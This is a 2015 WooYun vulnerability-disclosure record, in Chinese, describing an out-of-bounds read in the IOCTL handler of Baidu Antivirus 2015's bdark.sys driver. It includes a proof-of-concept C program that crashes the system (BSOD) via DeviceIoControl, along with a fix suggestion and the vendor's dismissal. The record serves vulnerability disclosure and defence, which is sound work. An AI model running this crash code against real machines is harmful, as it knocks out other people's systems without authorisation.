{"id": 70152, "wybug_id": "wooyun-2015-0122824", "wybug_title": "Baidu Antivirus2015某驱动拒绝服务漏洞", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2015-07-06 10:21", "wybug_open_date": "2015-10-09 10:23", "wybug_type": "拒绝服务", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务", "驱动"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-09：\t细节向公众公开  简要描述： Baidu Antivirus2015的bdark.sys驱动对IRP_MJ_DEVICE_CONTROL的处理存在一处漏洞，在数组读取时没有判断上限，导致越界访问，引发BSOD。 详细说明：  1.软件版本\n\n2.bdark.sys版本：2015.4.10.100103.漏洞分析：bdark.sys在IRP_MJ_DEVICE_CONTROL的处理函数中，对IoControlCode=0x222000的处理逻辑存在漏洞，没有判断InputBuffer前4个字节（当作DWORD使用）的长度上限，输入超长数值时，会导致数组读取越界，引发拒绝服务。   漏洞证明：  \nvoid Fuzz2(HANDLE hDev){\tDWORD dwReturned = 0;\tchar input[4096] = { 0 };\tchar output[4096] = { 0 };\t*((DWORD*)input) = 0xffff0000;\tDeviceIoControl(hDev,\t\t0x222000,\t\t(LPVOID)input,\t\t4,\t\t(LPVOID)output,\t\t0x60,\t\t&dwReturned,\t\tNULL);}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\foooo_dev\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif(INVALID_HANDLE_VALUE != hDev)\t{\t\tFuzz2(hDev);\t\tCloseHandle(hDev);\t}}int _tmain(int argc, _TCHAR* argv[]){\tFuzz1();\treturn 0;}\n   修复方案：  驱动做数组访问时，要对长度做检查，不要越界访问。不要完全信任上层传入的数据。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-09 10:23 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}